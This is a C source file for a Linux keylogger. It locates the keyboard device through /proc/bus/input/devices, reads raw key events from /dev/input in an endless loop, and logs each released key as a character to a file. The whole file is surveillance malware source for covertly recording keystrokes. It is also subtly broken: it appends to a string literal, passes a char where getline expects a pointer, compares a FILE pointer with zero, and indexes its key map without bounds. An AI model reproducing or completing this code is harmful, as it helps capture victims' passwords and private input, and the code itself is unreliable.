#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input-event-codes.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>

#include "keylogger.h"

void capture_keys(FILE *file, char *event) {
	struct input_event ev;

	char *path = "/dev/input/";

	strcat(path, event);

	int fd = open(path, O_RDONLY);

	char map[] = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./... ";

	while (1)
	{
		int r = read(fd, &ev, sizeof(ev));
		if ((ev.type == EV_KEY) && (ev.value == 0))
		{
			if (ev.code == 28) fprintf(file, "\n");
			if (ev.code == 14) fprintf(file , "<=");
			else
			{
				
				fprintf(file, "%c", map[ev.code]);
			}
			fflush(file);
		}
	}
	
	close(fd);
}

void find_keyboard(char *buffer, FILE *file) {
	FILE *ptr;
    size_t sz_line;
    char line;
    char handlers[256];

    ptr = fopen("/proc/bus/input/devices", "r");

	if (ptr < 0)
	{
		fprintf(file, "erro\n");
		fflush(file);
		exit(EXIT_FAILURE);
	}

    while (getline(&line, &sz_line, ptr) != -1)
    {
        if (strstr(line, "Handlers") != NULL) {
            strcpy(handlers, line);
            getline(&line, &sz_line, ptr);
            getline(&line, &sz_line, ptr);
            if (strstr(line, "EV=120013") != NULL) break;
        }
    }

    char *ev_ptr = strstr(handlers, "event");
    if (ev_ptr == NULL) printf("erro\n");
    else 
    {
		int i = 0;
        for (char *p = ev_ptr; *p != ' '; p++)
        {
            buffer[i++] = *p;
        }
        buffer[i++] = '\0';
    }

	fclose(ptr);
}